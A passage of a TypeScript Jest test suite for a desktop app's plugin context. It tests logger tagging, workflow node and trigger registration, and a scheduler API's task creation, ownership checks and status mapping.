/** @jest-environment jsdom */
/**
 * Plugin Context Tests
 */

import {
  createGuardedBrowserAPI,
  createPluginContext,
  createFullPluginContext,
  isFullPluginContext,
} from "./context"
import type { Plugin, PluginManifest } from "@/types/plugin"
import type { PluginManager } from "./manager"
import { invoke } from "@tauri-apps/api/core"
import { isTauri } from "@/lib/native/utils"
import { getPermissionGuard, resetPermissionGuard, PermissionError } from "@/lib/plugin/security"
import { executeAgent } from "@/lib/ai/agent/agent-executor"
import { getExternalAgentManager } from "@/lib/ai/agent/external/manager"
import { createAgentFromPreset } from "@/lib/ai/agent/external/config/presets"
import {
  protocolAdapterRegistry,
  unregisterPluginProtocolAdaptersByPlugin,
  __resetPluginProtocolAdaptersForTesting,
} from "@/lib/ai/agent/external/protocol-adapter"
import { invokePluginTool } from "@/lib/plugin/core/invoke-plugin-tool"
import {
  __resetPluginHostRuntimesForTesting,
  setAmbientHostRuntime,
} from "@/lib/plugin/runtime/host-runtime"
import { usePluginModalStore } from "@/stores/plugin-runtime/plugin-modal-store"
import {
  initializePluginPermissions,
  revokePluginPermissions,
} from "@/lib/plugin/api/permission-api"
import {
  getBackgroundAgentManager,
  __resetBackgroundAgentManagerForTesting,
} from "@/lib/ai/agent/background-agent-manager"
import { nodeCatalogEntry, __resetPluginCatalogForTesting } from "@/lib/workflow/nodes/catalog"
import { schedulerDb } from "@/lib/scheduler/scheduler-db"
import { getTaskScheduler } from "@/lib/scheduler/task-scheduler"
import type { ScheduledTask, TaskExecution } from "@/types/scheduler"
import {
  __resetCharacterPacksForTesting,
  getPackWarnings,
  registerCharacterPack,
} from "@/lib/plugin/registries/character-pack-registry"
import { __resetSkillsForTesting } from "@/lib/plugin/registries/skill-registry"
import { __resetMcpServerPresetsForTesting } from "@/lib/plugin/registries/mcp-server-preset-registry"
import { __resetNativeAnthropicToolsForTesting } from "@/lib/plugin/registries/native-anthropic-tool-registry"
import { PluginDisposableScope } from "./disposable-scope"
import { PluginRegistry } from "./registry"
import { subscribePluginApiAudit, pluginApiRuntimeForType } from "../contracts/interface-catalog"
import { PLUGIN_API_NAMESPACE_CONTRACTS } from "@cognia/plugin-sdk/contracts"
import { routePythonHostRequest } from "@/lib/plugin/python/host-request-router"
import { clearAllLinkMatchers, getLinkMatcher } from "@/lib/plugin/api/link-matchers"
import {
  registerViewContainer,
  __resetViewContainersForTesting,
} from "@/lib/plugin/registries/view-container-registry"
import { useUIStore } from "@/stores/ui"

// Mock Tauri invoke
jest.mock("@tauri-apps/api/core", () => ({
  invoke: jest.fn().mockResolvedValue(null),
}))
jest.mock("@/lib/tauri/transport-instance", () => ({
  transport: {
    call: (...args: unknown[]) => jest.requireMock("@tauri-apps/api/core").invoke(...args),
  },
}))

// Mock the logger so it routes to console for test assertions
jest.mock("./logger", () => ({
  loggers: {
    manager: { info: jest.fn(), warn: jest.fn(), error: jest.fn(), debug: jest.fn() },
  },
  createPluginSystemLogger: jest.fn(() => {
    const base = {
      info: (...args: unknown[]) => console.info(...args),
      warn: (...args: unknown[]) => console.warn(...args),
      error: (...args: unknown[]) => console.error(...args),
      debug: (...args: unknown[]) => console.debug(...args),
      // The real wrapper returns a logger carrying the context. Record it so a
      // test can read back what the plugin logger was tagged with.
      withContext: (context: Record<string, unknown>) => ({ ...base, context }),
    }
    return base
  }),
}))

// Mock rate limiter
jest.mock("@/lib/plugin/security/rate-limiter", () => ({
  getPluginRateLimiter: () => ({
    check: jest.fn(),
    checkLimit: jest.fn().mockReturnValue(true),
  }),
}))

jest.mock("@/lib/native/utils", () => ({
  isTauri: jest.fn(() => false),
}))

jest.mock("@/lib/scheduler/scheduler-db", () => ({
  schedulerDb: {
    getTask: jest.fn(),
    getFilteredTasks: jest.fn().mockResolvedValue([]),
    getExecution: jest.fn(),
    getTaskExecutions: jest.fn().mockResolvedValue([]),
    createExecution: jest.fn().mockResolvedValue(undefined),
    updateExecution: jest.fn().mockResolvedValue(undefined),
  },
}))

const mockUnsubscribeExecutions = jest.fn()
const mockSubscribeToTaskExecutions = jest.fn(
  (_listener: (event: { task: ScheduledTask; execution: TaskExecution }) => void) =>
    mockUnsubscribeExecutions
)
jest.mock("@/lib/scheduler/task-scheduler", () => ({
  getTaskScheduler: jest.fn(),
  subscribeToTaskExecutions: (
    listener: (event: { task: ScheduledTask; execution: TaskExecution }) => void
  ) => mockSubscribeToTaskExecutions(listener),
}))

// The write gate has its own suite; here it is a spy, so `createTask` can be
// shown to ask it, and to stop when it refuses.
const mockAssertTaskWriteAllowed = jest.fn(async (_request: unknown) => undefined as void)
jest.mock("@/lib/scheduler/write-authority", () => ({
  assertTaskWriteAllowed: (request: unknown) => mockAssertTaskWriteAllowed(request),
}))

const mockIsPluginTaskExecutionActive = jest.fn((_id: string) => false)
const mockCancelPluginTaskExecution = jest.fn((_id: string) => false)
jest.mock("@/lib/scheduler/executors/plugin-executor", () => ({
  isPluginTaskExecutionActive: (id: string) => mockIsPluginTaskExecutionActive(id),
  cancelPluginTaskExecution: (id: string) => mockCancelPluginTaskExecution(id),
}))

// Sonner toast — `ui.showToast` routes here.
jest.mock("sonner", () => ({
  toast: Object.assign(jest.fn(), {
    info: jest.fn(),
    success: jest.fn(),
    warning: jest.fn(),
    error: jest.fn(),
  }),
}))

jest.mock("../contracts/diagnostics-store", () => ({
  recordSilentFailure: jest.fn(),
  recordPluginPointDiagnostic: jest.fn(),
  getPluginPointDiagnostics: jest.fn(() => []),
  getAllPluginPointDiagnostics: jest.fn(() => ({})),
  clearPluginPointDiagnostics: jest.fn(),
  clearAllPluginPointDiagnostics: jest.fn(),
  subscribePluginPointDiagnostics: jest.fn(() => () => {}),
  getPluginPointDiagnosticsRevision: jest.fn(() => 0),
}))

const dispatchPluginTrigger = jest.fn(async (_input: unknown) => ({
  ok: true,
  prefixedKind: "trigger.test-plugin.webhookLite",
}))
jest.mock("../bridge/plugin-trigger-dispatch", () => ({
  dispatchPluginTrigger: (input: unknown) => dispatchPluginTrigger(input),
}))

// Mock IPC, message-bus, i18n-loader, debugger
jest.mock("../messaging/ipc", () => ({
  createIPCAPI: jest.fn(() => ({})),
}))
jest.mock("../messaging/message-bus", () => ({
  createEventAPI: jest.fn(() => ({})),
}))
jest.mock("../utils/i18n-loader", () => ({
  getPluginI18nLoader: jest.fn(() => ({
    createPluginAPI: jest.fn(() => ({})),
  })),
}))
const mockStartDebugSession = jest.fn()
const mockCreateDebugContext = jest.fn((_pluginId: string, context: unknown) => context)
jest.mock("../devtools/debugger", () => ({
  getPluginDebugger: jest.fn(() => ({
    startSession: mockStartDebugSession,
    createDebugContext: mockCreateDebugContext,
  })),
}))

// Mock plugin store
const mockStorePlugins: Record<string, { config?: Record<string, unknown> }> = {}
jest.mock("@/stores/plugin-runtime", () => ({
  usePluginStore: {
    getState: () => ({
      plugins: mockStorePlugins,
      emitEvent: jest.fn(),
      registerPluginTool: jest.fn(),
      unregisterPluginTool: jest.fn(),
      registerPluginMode: jest.fn(),
      unregisterPluginMode: jest.fn(),
      registerPluginComponent: jest.fn(),
    }),
  },
}))

// Mock a2ui store. One shared object rather than a fresh one per `getState()`
// so a test can assert on what the API actually dispatched.
const a2uiStoreState = {
  createSurface: jest.fn(),
  deleteSurface: jest.fn(),
  updateComponents: jest.fn(),
  updateDataModel: jest.fn(),
  getSurface: jest.fn(),
  processMessage: jest.fn(),
}
jest.mock("@/stores/a2ui", () => ({
  useA2UIStore: { getState: () => a2uiStoreState },
}))

// Mock settings store
jest.mock("@/stores/settings", () => ({
  useSettingsStore: {
    getState: () => ({}),
    subscribe: jest.fn(() => () => {}),
  },
}))

// Mock the imperative agent-execution entry points (dynamically imported by
// `createAgentAPI`). The background-agent-manager + permission-api stay REAL
// so cancellation registration and permission gating are exercised end-to-end.
jest.mock("@/lib/ai/agent/agent-executor", () => {
  // The execution service dispatches through the rail functions, not
  // `executeAgent` directly. Both rails delegate to the one mock so every
  // assertion below still reads the config the service actually built.
  const executeAgent = jest.fn(async () => ({
    text: "agent reply",
    channel: "text",
    toolsAvailable: false,
  }))
  return {
    executeAgent,
    runAgentRail: (...a: unknown[]) => executeAgent(...(a as [])),
    runCompletionRail: (...a: unknown[]) => executeAgent(...(a as [])),
  }
})
jest.mock("@/lib/plugin/core/invoke-plugin-tool", () => ({
  invokePluginTool: jest.fn(async (pluginId: string, toolName: string) => ({
    result: { ok: true, toolName },
    pluginId,
    toolName,
  })),
}))
jest.mock("@/lib/ai/agent/external/manager", () => ({
  getExternalAgentManager: jest.fn(),
}))
jest.mock("@/lib/ai/agent/external/config/presets", () => ({
  registerPreset: jest.fn(),
  createAgentFromPreset: jest.fn(),
}))
// `runExternalAgent` admission reads the master switch / the target config
// from the store and the readiness verdict from the lifecycle (ADR-0216).
const mockExternalAgentStoreState = {
  enabled: true,
  defaultPermissionMode: "default",
  getAgent: jest.fn((_id: string): unknown => undefined),
}
jest.mock("@/stores/agent/external-agent-store", () => ({
  useExternalAgentStore: {
    getState: () => mockExternalAgentStoreState,
    subscribe: () => () => {},
  },
}))
const mockExternalAgentLifecycle = {
  assessReadiness: jest.fn(async () => ({ status: "ready" })),
  connect: jest.fn(async () => undefined),
}
jest.mock("@/lib/ai/agent/external/lifecycle/service", () => ({
  getExternalAgentLifecycleService: async () => mockExternalAgentLifecycle,
}))

const mockManifest: PluginManifest = {
  id: "test-plugin",
  name: "Test Plugin",
  version: "1.0.0",
  description: "A test plugin",
  type: "frontend",
  capabilities: ["tools"],
  author: { name: "Test" },
  main: "index.ts",
  permissions: ["network:fetch", "network:upload"],
  networkAccess: {
    allowedDomains: ["*"],
    reasoning: "Test fixture: exercises the unrestricted-egress opt-in.",
  },
}

const createMockPlugin = (overrides?: Partial<Plugin>): Plugin => ({
  manifest: mockManifest,
  status: "enabled",
  source: "local",
  path: "/plugins/test-plugin",
  config: {},
  ...overrides,
})

const mockManager = {
  // The promoted `web_fetch` reads the caller's manifest to apply the same
  // `networkAccess` egress clamp `ctx.network` gets, so the stub has to answer.
  getPlugin: jest.fn(() => createMockPlugin()),
  getPluginPointGovernanceMode: jest.fn(() => "warn"),
  createPluginServicesAPI: jest.fn(() => ({
    isAvailable: () => false,
    getProvider: () => undefined,
  })),
  callPythonFunction: jest.fn(),
  evalPython: jest.fn(),
  importPythonModule: jest.fn(),
  callPythonModule: jest.fn(),
  getPythonModuleAttribute: jest.fn(),
} as unknown as PluginManager

const mockIsTauri = isTauri as jest.MockedFunction<typeof isTauri>
const mockSchedulerDb = schedulerDb as jest.Mocked<typeof schedulerDb>
const mockGetTaskScheduler = getTaskScheduler as jest.MockedFunction<typeof getTaskScheduler>

function pluginTask(overrides: Partial<ScheduledTask> = {}): ScheduledTask {
  const now = new Date("2026-07-16T00:00:00.000Z")
  return {
    id: "plugin-task-1",
    name: "Plugin task",
    type: "plugin",
    trigger: { type: "interval", intervalMs: 60_000 },
    payload: { pluginId: "test-plugin", handler: "heartbeat", args: {} },
    config: {
      timeout: 300_000,
      maxRetries: 0,
      retryDelay: 60_000,
      runMissedOnStartup: false,
      allowConcurrent: false,
    },
    notification: { onStart: false, onComplete: false, onError: true },
    status: "active",
    runCount: 0,
    successCount: 0,
    failureCount: 0,
    createdAt: now,
    updatedAt: now,
    ...overrides,
  }
}

describe("createPluginContext", () => {
  beforeEach(() => {
    mockStartDebugSession.mockClear()
    mockCreateDebugContext.mockClear()
    mockIsTauri.mockReturnValue(false)
    __resetCharacterPacksForTesting()
    __resetSkillsForTesting()
    __resetMcpServerPresetsForTesting()
    __resetNativeAnthropicToolsForTesting()
    // The native fs/clipboard/secrets/network namespaces are now guarded — a
    // call fails closed unless the plugin's permission is registered. Register
    // the superset the suite exercises so the existing call-site assertions
    // still reach their implementations.
    resetPermissionGuard()
    getPermissionGuard().registerPlugin("test-plugin", [
      "filesystem:read",
      "filesystem:write",
      "clipboard:read",
      "clipboard:write",
      "secrets:read",
      "secrets:write",
      "network:fetch",
      "database:read",
      "database:write",
    ])
    Object.defineProperty(global.navigator, "clipboard", {
      configurable: true,
      value: {
        readText: jest.fn().mockResolvedValue("browser clipboard"),
        writeText: jest.fn().mockResolvedValue(undefined),
      },
    })
  })

  it("should create context with plugin ID", () => {
    const plugin = createMockPlugin()
    const context = createPluginContext(plugin, mockManager)

    expect(context.pluginId).toBe("test-plugin")
  })

  it("tags ctx.logger as the plugin log source, debug session or not", () => {
    // `getLogSource()` in the log panel keys off `origin`/`runtime`, so an
    // untagged logger files a plugin's own output as ordinary frontend noise
    // and the detail pane's `src=plugin` deep link matches none of it. Tagging
    // it here rather than bridging the devtools ring is what makes that true
    // for a built-in plugin with developer mode off, which is the default.
    const context = createPluginContext(createMockPlugin(), mockManager)

    expect((context.logger as unknown as { context: Record<string, unknown> }).context).toEqual({
      runtime: "plugin",
      origin: "plugin",
      pluginId: "test-plugin",
    })
  })

  it("tags debug sessions with the activation generation", () => {
    const plugin = createMockPlugin()

    const context = createPluginContext(plugin, mockManager, {
      enableDebug: true,
      generation: 12,
    })

    expect(mockStartDebugSession).toHaveBeenCalledWith("test-plugin", 12)
    expect(mockCreateDebugContext).toHaveBeenCalledWith(
      "test-plugin",
      expect.objectContaining({ pluginId: "test-plugin" })
    )
    expect(context.pluginId).toBe("test-plugin")
  })

  it("refreshes character-pack dependency warnings after imperative registrations", () => {
    const context = createPluginContext(createMockPlugin(), mockManager)
    registerCharacterPack("waiting", {
      id: "waiting",
      name: "Waiting",
      version: "1.0.0",
      characters: [],
      requires: {
        skills: ["dynamic-skill"],
        mcpServerPresets: ["dynamic-mcp"],
        nativeAnthropicTools: ["dynamic-native-tool"],
      },
    })

    expect(getPackWarnings("waiting")).toHaveLength(3)

    context.agent.registerSkill({
      id: "dynamic-skill",
      name: "Dynamic skill",
      description: "Registers after the pack.",
      source: { kind: "inline", markdown: "# Dynamic skill" },
    })
    expect(getPackWarnings("waiting").map((warning) => warning.missingId)).toEqual([
      "dynamic-mcp",
      "dynamic-native-tool",
    ])

    context.agent.registerMcpServerPreset({
      id: "dynamic-mcp",
      name: "Dynamic MCP",
      transport: "stdio",
      config: { command: "echo" },
    })
    expect(getPackWarnings("waiting").map((warning) => warning.missingId)).toEqual([
      "dynamic-native-tool",
    ])

    context.agent.registerNativeAnthropicTool({
      id: "dynamic-native-tool",
      name: "Dynamic native tool",
      type: "bash_20250124",
      executeIpc: { invoke: "dynamic_native_tool" },
    })
    expect(getPackWarnings("waiting")).toEqual([])
  })

  describe("workflow extension API", () => {
    beforeEach(() => {
      dispatchPluginTrigger.mockClear()
    })

    afterEach(() => {
      __resetPluginCatalogForTesting()
    })

    it("surfaces plugin node default params on the hot-merged catalog entry", () => {
      const context = createPluginContext(createMockPlugin(), mockManager)
      const dispose = context.workflow.registerNode({
        kind: "action.format",
        typeVersion: 1,
        category: "plugin",
        label: "Format",
        description: "Format text",
        iconName: "Wand",
        paramsSchema: { type: "object" },
        defaultParams: { mode: "markdown", retries: 2 },
        execute: async () => ({ output: {} }),
      })

      const entry = nodeCatalogEntry("test-plugin.action.format" as never)
      expect(entry.defaultParams).toEqual({ mode: "markdown", retries: 2 })
      expect(entry.typeVersion).toBe(1)

      dispose()
    })

    it("surfaces plugin trigger default params on the hot-merged catalog entry", () => {
      const context = createPluginContext(createMockPlugin(), mockManager)
      const dispose = context.workflow.registerTrigger({
        kind: "trigger.webhookLite",
        typeVersion: 1,
        label: "Webhook lite",
        description: "Receive webhook events",
        iconName: "Webhook",
        paramsSchema: { type: "object" },
        defaultParams: { path: "/demo", method: "POST" },
        start: async () => ({ stop: jest.fn() }),
      })

      const entry = nodeCatalogEntry("trigger.test-plugin.webhookLite" as never)
      expect(entry.defaultParams).toEqual({ path: "/demo", method: "POST" })
      expect(entry.typeVersion).toBe(1)

      dispose()
    })

    it("forwards an exact workflow trigger-node id for plugin emissions", async () => {
      const context = createPluginContext(createMockPlugin(), mockManager)

      context.workflow.emitTriggerEvent(
        "wf-1",
        "trigger.webhookLite",
        { event: "created" },
        "root-b"
      )
      await Promise.resolve()

      expect(dispatchPluginTrigger).toHaveBeenCalledWith({
        pluginId: "test-plugin",
        workflowId: "wf-1",
        kind: "trigger.webhookLite",
        payload: { event: "created" },
        triggerId: "root-b",
      })
    })
  })

  describe("scheduler API", () => {
    const engine = {
      createTask: jest.fn(),
      updateTask: jest.fn(),
      deleteTask: jest.fn(),
      pauseTask: jest.fn(),
      resumeTask: jest.fn(),
      runTaskNow: jest.fn(),
      cancelExecution: jest.fn(),
      getQueuedStartTaskId: jest.fn(),
      fireEventTasks: jest.fn(),
    }

    beforeEach(() => {
      jest.clearAllMocks()
      mockGetTaskScheduler.mockReturnValue(engine as never)
      mockSchedulerDb.getTask.mockResolvedValue(null)
      mockSchedulerDb.getExecution.mockResolvedValue(null)
      mockSchedulerDb.getTaskExecutions.mockResolvedValue([])
      mockSchedulerDb.getFilteredTasks.mockResolvedValue([])
      mockAssertTaskWriteAllowed.mockResolvedValue(undefined)
      engine.createTask.mockImplementation(async (input: Partial<ScheduledTask>) =>
        pluginTask({
          name: input.name,
          trigger: input.trigger,
          payload: input.payload,
          config: input.config as ScheduledTask["config"],
          createdBy: input.createdBy,
          endAt: input.endAt,
        })
      )
    })

    const schedulerPlugin = () =>
      createMockPlugin({
        manifest: { ...mockManifest, capabilities: ["tools", "scheduler"] },
      })
    const api = () => createPluginContext(schedulerPlugin(), mockManager).scheduler

    function execution(overrides: Partial<TaskExecution> = {}): TaskExecution {
      return {
        id: "exec-1",
        taskId: "plugin-task-1",
        taskName: "Plugin task",
        taskType: "plugin",
        status: "completed",
        retryAttempt: 0,
        startedAt: new Date("2026-07-16T01:00:00.000Z"),
        logs: [],
        ...overrides,
      }
    }

    it("rejects scheduler calls when the manifest omits the capability", async () => {
      const context = createPluginContext(createMockPlugin(), mockManager)

      await expect(context.scheduler.listTasks()).rejects.toThrow(/scheduler.*capability/i)
      await expect(context.scheduler.emitEvent("x")).rejects.toThrow(/capability/i)
      expect(() => context.scheduler.onExecution(() => undefined)).toThrow(/capability/i)

      expect(mockGetTaskScheduler).not.toHaveBeenCalled()
    })

    describe("createTask", () => {
      it("creates through the live engine, attributed to the plugin and past the write gate", async () => {
        engine.createTask.mockResolvedValueOnce(
          pluginTask({
            payload: { pluginId: "test-plugin", handler: "heartbeat", metadata: { tier: 2 } },
          })
        )

        const created = await api().createTask({
          name: "Plugin task",
          trigger: { type: "interval", seconds: 60 },
          handler: "heartbeat",
        })

        expect(mockAssertTaskWriteAllowed).toHaveBeenCalledWith({
          taskType: "plugin",
          source: "plugin",
          pluginId: "test-plugin",
        })
        expect(engine.createTask).toHaveBeenCalledWith(
          expect.objectContaining({
            name: "Plugin task",
            type: "plugin",
            trigger: { type: "interval", intervalMs: 60_000 },
            payload: expect.objectContaining({ pluginId: "test-plugin", handler: "heartbeat" }),
            createdBy: { kind: "plugin", pluginId: "test-plugin" },
          })
        )
        expect(created.id).toBe("plugin-task-1")
        expect(created.metadata).toEqual({ tier: 2 })
      })

      it("throws the gate's refusal and creates nothing", async () => {
        mockAssertTaskWriteAllowed.mockRejectedValueOnce(new Error("quota reached"))
        await expect(
          api().createTask({ name: "n", trigger: { type: "interval", seconds: 60 }, handler: "h" })
        ).rejects.toThrow("quota reached")
        expect(engine.createTask).not.toHaveBeenCalled()
      })

      it("maps every execution option onto the scheduler's units", async () => {
        const created = await api().createTask({
          name: "n",
          handler: "h",
          trigger: { type: "cron", expression: "0 9 * * *", timezone: "UTC" },
          timeout: 30,
          retry: { maxAttempts: 2, delaySeconds: 10 },
          overlapPolicy: "queue-all",
          maxQueueSize: 4,
          maxRuns: 9,
          pauseAfterConsecutiveFailures: 3,
          jitterSeconds: 5,
          catchupWindowSeconds: 600,
          runMissedOnStartup: true,
          maxMissedRuns: 2,
          maxRetryDelaySeconds: 120,
          endAt: "2030-01-01T00:00:00.000Z",
        })

        const input = engine.createTask.mock.calls[0][0]
        expect(input.trigger).toEqual({
          type: "cron",
          cronExpression: "0 9 * * *",
          timezone: "UTC",
          jitterMs: 5_000,
        })
        expect(input.config).toEqual(
          expect.objectContaining({
            timeout: 30_000,
            maxRetries: 2,
            retryDelay: 10_000,
            overlapPolicy: "queue-all",
            maxQueueSize: 4,
            maxRuns: 9,
            pauseAfterConsecutiveFailures: 3,
            catchupWindowMs: 600_000,
            runMissedOnStartup: true,
            maxMissedRuns: 2,
            maxRetryDelay: 120_000,
          })
        )
        expect(input.endAt).toEqual(new Date("2030-01-01T00:00:00.000Z"))
        // And the same fields read back on the task.
        expect(created).toMatchObject({
          overlapPolicy: "queue-all",
          maxQueueSize: 4,
          maxRuns: 9,
          pauseAfterConsecutiveFailures: 3,
          jitterSeconds: 5,
          catchupWindowSeconds: 600,
          runMissedOnStartup: true,
          maxMissedRuns: 2,
          maxRetryDelaySeconds: 120,
          retry: { maxAttempts: 2, delaySeconds: 10, backoffMultiplier: 2 },
          timeout: 30,
        })
      })

      it("implements backoffMultiplier 1 as a fixed delay and rejects any other curve", async () => {
        const created = await api().createTask({
          name: "n",
          handler: "h",
          trigger: { type: "interval", seconds: 60 },
          retry: { maxAttempts: 3, delaySeconds: 20, backoffMultiplier: 1 },
        })
        expect(engine.createTask.mock.calls[0][0].config).toEqual(
          expect.objectContaining({ retryDelay: 20_000, maxRetryDelay: 20_000 })
        )
        expect(created.retry?.backoffMultiplier).toBe(1)

        await expect(
          api().createTask({
            name: "n",
            handler: "h",
            trigger: { type: "interval", seconds: 60 },
            retry: { maxAttempts: 3, delaySeconds: 20, backoffMultiplier: 3 },
          })
        ).rejects.toThrow(/backoffMultiplier/)
        await expect(
          api().createTask({
            name: "n",
            handler: "h",
            trigger: { type: "interval", seconds: 60 },
            retry: { maxAttempts: 3, delaySeconds: 20, backoffMultiplier: 1 },
            maxRetryDelaySeconds: 60,
          })
        ).rejects.toThrow(/cannot be combined/)
      })

      it.each([
        [{ type: "interval" }, /trigger.seconds/],
        [{ type: "interval", seconds: 0 }, /trigger.seconds/],
        [{ type: "cron", expression: "  " }, /trigger.expression/],
        [{ type: "once", runAt: "not a date" }, /trigger.runAt/],
        [{ type: "event" }, /trigger.eventType/],
        [{ type: "hourly" }, /unknown trigger type "hourly"/],
        [null, /trigger must be an object/],
      ])("rejects the malformed trigger %j instead of guessing", async (trigger, message) => {
        await expect(
          api().createTask({ name: "n", handler: "h", trigger: trigger as never })
        ).rejects.toThrow(message)
        expect(engine.createTask).not.toHaveBeenCalled()
      })

      it("refuses jitter on a trigger the scheduler does not jitter", async () => {
        await expect(
          api().createTask({
            name: "n",
            handler: "h",
            trigger: { type: "event", eventType: "x" },
            jitterSeconds: 5,
          })
        ).rejects.toThrow(/jitterSeconds only applies/)
      })

      it("starts the first run of a startImmediately interval and reports the flag back", async () => {
        engine.runTaskNow.mockResolvedValue(null)
        const created = await api().createTask({
          name: "n",
          handler: "h",
          trigger: { type: "interval", seconds: 60, startImmediately: true },
        })
        await Promise.resolve()
        await Promise.resolve()

        expect(engine.createTask.mock.calls[0][0].payload).toEqual(
          expect.objectContaining({ startImmediately: true })
        )
        expect(engine.runTaskNow).toHaveBeenCalledWith("plugin-task-1", {
          triggerSource: "schedule",
        })
        expect(created.trigger).toEqual({ type: "interval", seconds: 60, startImmediately: true })
      })

      it("parks a task created disabled, without starting it", async () => {
        engine.pauseTask.mockResolvedValue(true)
        const created = await api().createTask({
          name: "n",
          handler: "h",
          trigger: { type: "interval", seconds: 60, startImmediately: true },
          enabled: false,
        })
        expect(engine.pauseTask).toHaveBeenCalledWith("plugin-task-1")
        expect(engine.runTaskNow).not.toHaveBeenCalled()
        expect(created.status).toBe("paused")
      })
    })

    describe("ownership", () => {
      const foreign: Array<[string, Partial<ScheduledTask>]> = [
        ["another plugin's task", { payload: { pluginId: "another-plugin", handler: "h" } }],
        [
          "a non-plugin task whose payload names this plugin",
          { type: "chat", payload: { pluginId: "test-plugin", handler: "h" } },
        ],
        [
          "a task another plugin created",
          { createdBy: { kind: "plugin", pluginId: "another-plugin" } },
        ],
      ]

      it.each(foreign)("refuses %s on every task-scoped method", async (_label, overrides) => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask(overrides))
        mockSchedulerDb.getExecution.mockResolvedValue(execution({ status: "running" }))
        const scheduler = api()

        await expect(scheduler.getTask("plugin-task-1")).resolves.toBeNull()
        await expect(scheduler.updateTask("plugin-task-1", { name: "x" })).resolves.toBeNull()
        await expect(scheduler.deleteTask("plugin-task-1")).resolves.toBe(false)
        await expect(scheduler.pauseTask("plugin-task-1")).resolves.toBe(false)
        await expect(scheduler.resumeTask("plugin-task-1")).resolves.toBe(false)
        await expect(scheduler.runTaskNow("plugin-task-1")).rejects.toThrow(/Task not found/)
        await expect(scheduler.cancelExecution("exec-1")).resolves.toBe(false)
        await expect(scheduler.getExecutions("plugin-task-1")).resolves.toEqual([])
        await expect(scheduler.getExecution("exec-1")).resolves.toBeNull()
        await expect(scheduler.getLatestExecution("plugin-task-1")).resolves.toBeNull()
        await expect(scheduler.getStatistics("plugin-task-1")).resolves.toBeNull()

        for (const method of Object.values(engine)) expect(method).not.toHaveBeenCalled()
      })

      it("accepts a legacy manifest row the scheduler attributed to the user", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask({ createdBy: { kind: "user" } }))
        await expect(api().getTask("plugin-task-1")).resolves.toMatchObject({
          id: "plugin-task-1",
        })
      })
    })

    describe("reads and status", () => {
      it.each<[string, Partial<ScheduledTask>, string]>([
        ["a healthy active task", {}, "active"],
        ["a task whose last terminal run failed", { consecutiveFailures: 2 }, "error"],
        ["a legacy row with only lastError", { lastError: "boom" }, "error"],
        ["a paused task", { status: "paused" }, "paused"],
        ["an auto-paused task", { status: "paused", lastTerminalReason: "auto-paused" }, "paused"],
        ["a disabled task", { status: "disabled" }, "disabled"],
        [
          "a task that used its maxRuns",
          { status: "expired", lastTerminalReason: "max-runs-reached" },
          "completed",
        ],
        [
          "a once task that ran",
          {
            status: "expired",
            runCount: 1,
            trigger: { type: "once", runAt: new Date("2026-07-16T02:00:00Z") },
          },
          "completed",
        ],
        ["a task past its endAt", { status: "expired", lastTerminalReason: "ended" }, "expired"],
        [
          "a once task whose slot was missed",
          {
            status: "expired",
            runCount: 0,
            trigger: { type: "once", runAt: new Date("2026-07-16T02:00:00Z") },
          },
          "expired",
        ],
      ])("derives the status of %s", async (_label, overrides, status) => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask(overrides))
        await expect(api().getTask("plugin-task-1")).resolves.toMatchObject({ status })
      })

      it("filters listTasks on the derived status, handler, errors and page", async () => {
        mockSchedulerDb.getFilteredTasks.mockResolvedValue([
          pluginTask({ id: "ok" }),
          pluginTask({ id: "failing", consecutiveFailures: 1, lastError: "boom" }),
          pluginTask({
            id: "done",
            status: "expired",
            lastTerminalReason: "max-runs-reached",
            payload: { pluginId: "test-plugin", handler: "other" },
          }),
          pluginTask({ id: "foreign", payload: { pluginId: "another-plugin", handler: "h" } }),
        ])
        const scheduler = api()

        const ids = async (filter: Parameters<typeof scheduler.listTasks>[0]) =>
          (await scheduler.listTasks(filter)).map((task) => task.id)

        // `error` and `completed` are not stored values. Filtering the stored
        // column used to drop them and return every task instead.
        await expect(ids({ status: "error" })).resolves.toEqual(["failing"])
        await expect(ids({ status: ["completed", "active"] })).resolves.toEqual(["ok", "done"])
        await expect(ids({ hasErrors: true })).resolves.toEqual(["failing"])
        await expect(ids({ hasErrors: false })).resolves.toEqual(["ok", "done"])
        await expect(ids({ handler: "other" })).resolves.toEqual(["done"])
        await expect(ids({ offset: 1, limit: 1 })).resolves.toEqual(["failing"])
        await expect(ids(undefined)).resolves.toEqual(["ok", "failing", "done"])
        expect(mockSchedulerDb.getFilteredTasks).toHaveBeenCalledWith({
          types: ["plugin"],
          tags: undefined,
          search: undefined,
        })
      })

      it("fills lastResult from the latest settled run, metrics included", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(
          pluginTask({ lastRunAt: new Date("2026-07-16T01:00:00Z") })
        )
        mockSchedulerDb.getTaskExecutions.mockResolvedValue([
          execution({ id: "skipped", status: "skipped" }),
          execution({
            id: "done",
            status: "completed",
            output: { rows: 3 },
            duration: 1200,
            logs: [
              {
                id: "m",
                timestamp: new Date(),
                level: "info",
                message: "Handler metrics",
                data: { kind: "plugin-task-metrics", metrics: { itemsProcessed: 3 } },
              },
            ],
          }),
        ])
        await expect(api().getTask("plugin-task-1")).resolves.toMatchObject({
          lastResult: {
            success: true,
            output: { rows: 3 },
            metrics: { itemsProcessed: 3, duration: 1200 },
          },
        })
      })

      it("reports a stored trigger faithfully, never as an invented interval", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(
          pluginTask({ trigger: { type: "cron" } as ScheduledTask["trigger"] })
        )
        await expect(api().getTask("plugin-task-1")).resolves.toMatchObject({
          trigger: { type: "cron", expression: "" },
        })
      })

      it("maps executions: slot, timeout, skipped, result and the handler's own log data", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask())
        const slot = new Date("2026-07-16T00:59:00.000Z")
        mockSchedulerDb.getTaskExecutions.mockResolvedValue([
          execution({
            id: "slow",
            status: "failed",
            terminalReason: "execution-timeout",
            error: "timed out",
            scheduledFor: slot,
            triggerSource: "schedule",
            logs: [
              {
                id: "l",
                timestamp: new Date(),
                level: "warn",
                message: "slow page",
                data: { kind: "plugin-task-log", data: { page: 4 } },
              },
            ],
          }),
          execution({ id: "skip", status: "skipped", terminalReason: "overlap-skipped" }),
        ])

        const [slow, skip] = await api().getExecutions("plugin-task-1", 10)

        expect(mockSchedulerDb.getTaskExecutions).toHaveBeenCalledWith("plugin-task-1", 10)
        expect(slow).toMatchObject({
          status: "timeout",
          scheduledAt: slot,
